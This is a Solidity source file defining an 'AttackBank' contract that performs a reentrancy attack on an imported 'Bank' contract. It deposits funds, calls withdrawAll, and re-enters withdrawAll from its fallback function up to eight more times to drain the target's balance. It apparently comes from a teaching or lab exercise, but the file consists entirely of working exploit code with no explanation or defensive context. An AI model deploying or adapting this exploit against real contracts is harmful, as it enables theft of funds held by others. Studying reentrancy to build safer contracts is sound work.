pragma solidity ^0.4.10;
import "bank.sol";
contract AttackBank {
    address moneyheist;
    Bank bank_to_rob;
    uint count;
    function AttackBank(address _moneyheist) public payable {
        moneyheist = _moneyheist;
        bank_to_rob = Bank(moneyheist);
    }
    
    function deposit() public payable {
        bank_to_rob.deposit.value(address(this).balance)();
    }
    
    function withdraw() public payable{
        bank_to_rob.withdrawAll();
    }
    
    function () payable{
        count += 1;
        if (count <9){
            bank_to_rob.withdrawAll();
        }
    }
    function get_balance() public returns(uint){
        return address(this).balance;
    }
}